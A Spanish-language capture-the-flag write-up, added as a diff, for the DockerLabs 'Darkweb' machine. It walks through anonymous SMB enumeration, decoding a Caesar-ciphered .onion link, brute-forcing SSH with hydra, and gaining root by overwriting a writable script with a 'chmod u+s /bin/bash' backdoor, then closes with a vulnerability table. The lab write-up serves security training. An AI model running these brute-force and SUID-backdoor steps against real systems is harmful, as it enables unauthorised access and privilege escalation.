@@ -1,0 +1,230 @@
+---
+title: Darkweb
+description: Resolución completa de la máquina virtual *Darkweb* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Darkweb**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone servicios SMB accesibles sin autenticación, desde donde se extrae un archivo con texto cifrado mediante **cifrado César**. Tras descifrarlo, se obtiene un enlace `.onion` que conduce a un sitio en la red Tor, donde se descubren un usuario y una lista de contraseñas en el código fuente de las páginas.
+Con esta información, se realiza un ataque de fuerza bruta contra SSH, obteniendo acceso como el usuario `dark`. Una vez dentro, se identifica que el usuario puede ejecutar un script Python (`hidden.py`) como `root` mediante `sudo`. Este script llama a un archivo Bash en un directorio donde el usuario tiene permisos de escritura, permitiendo modificar su contenido para otorgar privilegios SUID a `/bin/bash` y escalar a superusuario.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Darkweb',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '17/12/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Darkweb.zip
+sudo bash auto_deploy.sh Darkweb.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Darkweb/{content,exploits,nmap,scripts}
+cd Darkweb
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **139/tcp** — SMB
+* **445/tcp** — SMB
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1776886581/Ports_rpeqd5.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,139,445 172.17.0.2
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1776886582/Services_z5mvfc.png)
+
+El servicio SMB no requiere autenticación.
+
+---
+
+### 1.3 Enumeración SMB
+
+Se utiliza `enum4linux` para descubrir recursos compartidos:
+
+```bash
+enum4linux -a 172.17.0.2
+```
+
+![Shares SMB](https://res.cloudinary.com/dewqswzke/image/upload/v1776886582/SharesSmb_yqbepm.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Extracción de archivos SMB
+
+Se accede al recurso compartido:
+
+```bash
+smbclient \\\\172.17.0.2\\darkshare
+```
+
+![SMB Content](https://res.cloudinary.com/dewqswzke/image/upload/v1776886583/SMBContent_dt8rm9.png)
+
+Se descargan todos los archivos. El archivo `ilegal.txt` contiene texto cifrado en **cifrado César**:
+
+![Content ilegal](https://res.cloudinary.com/dewqswzke/image/upload/v1776886581/ContentIlegal_l8von7.png)
+
+Se descifra el texto:
+
+![Cesar Cipher](https://res.cloudinary.com/dewqswzke/image/upload/v1776886580/CesarCipher_acbmur.png)
+
+El texto descifrado contiene un enlace `.onion`.
+
+### 2.2 Navegación en Tor
+
+Se accede al enlace `.onion` mediante el navegador Tor. Revisando el código fuente de las páginas, se encuentra:
+
+- En `marketplace.html`: una lista de contraseñas.
+  ![Script hidden marketplace](https://res.cloudinary.com/dewqswzke/image/upload/v1776886581/ScriptHiddenMarketplace_pjvunt.png)
+
+- En `redroom.html`: un usuario (`dark`).
+  ![User redroom](https://res.cloudinary.com/dewqswzke/image/upload/v1776886584/UserRedRoom_o2hoyw.png)
+
+### 2.3 Fuerza bruta SSH
+
+Con el usuario `dark` y la lista de contraseñas, se realiza un ataque de fuerza bruta:
+
+```bash
+hydra -l dark -P passwordList ssh://172.17.0.2 -I
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1776886581/Hydra_yg0xrn.png)
+
+Se accede al sistema:
+
+```bash
+ssh dark@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1776886583/SSH_pzozx4.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De dark → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1776886584/Sudo-l_nizuzg.png)
+
+El usuario puede ejecutar `hidden.py` como root. El script llama a `/usr/local/bin/Update.sh`.
+
+El directorio `/usr/local/bin` es modificable por el usuario. Se elimina el archivo original y se crea uno nuevo:
+
+```bash
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+Se ejecuta el script Python con `sudo`:
+
+```bash
+sudo ./hidden.py
+```
+
+Se obtiene una shell con privilegios de root:
+
+```bash
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1776886581/Root_jlxidq.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SMB accesible sin autenticación",
+      severity: "Alta",
+      impact: "Exposición de archivos sensibles del sistema"
+    },
+    {
+      vulnerability: "Almacenamiento de texto cifrado (César) en archivo accesible",
+      severity: "Media",
+      impact: "Ofuscación trivial que no impide la lectura"
+    },
+    {
+      vulnerability: "Exposición de credenciales en código fuente JavaScript",
+      severity: "Alta",
+      impact: "Revelación de usuario y lista de contraseñas"
+    },
+    {
+      vulnerability: "Permiso sudo para script Python sin restricciones",
+      severity: "Crítica",
+      impact: "Ejecución de código como root indirectamente"
+    },
+    {
+      vulnerability: "Escritura en directorio /usr/local/bin por usuario no privilegiado",
+      severity: "Crítica",
+      impact: "Reemplazo de script con código malicioso"
+    },
+    {
+      vulnerability: "Script llama a archivo Bash sin validar su integridad",
+      severity: "Alta",
+      impact: "Facilita la sustitución del archivo invocado"
+    }
+  ]}
+/>
